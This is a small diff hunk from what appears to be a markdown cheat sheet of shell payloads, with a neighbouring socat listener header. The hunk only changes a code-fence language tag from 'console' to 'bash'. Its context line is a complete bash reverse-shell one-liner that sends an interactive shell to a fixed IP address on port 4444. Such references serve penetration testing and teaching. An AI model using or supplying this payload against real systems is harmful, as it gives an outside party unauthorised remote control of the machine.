@@ -94,7 +94,7 @@ socat TCP-L:<port>
 
 ### Bash
 
-```console
+```bash
 bash -i >& /dev/tcp/10.38.1.112/4444 0>&1
 ```
 
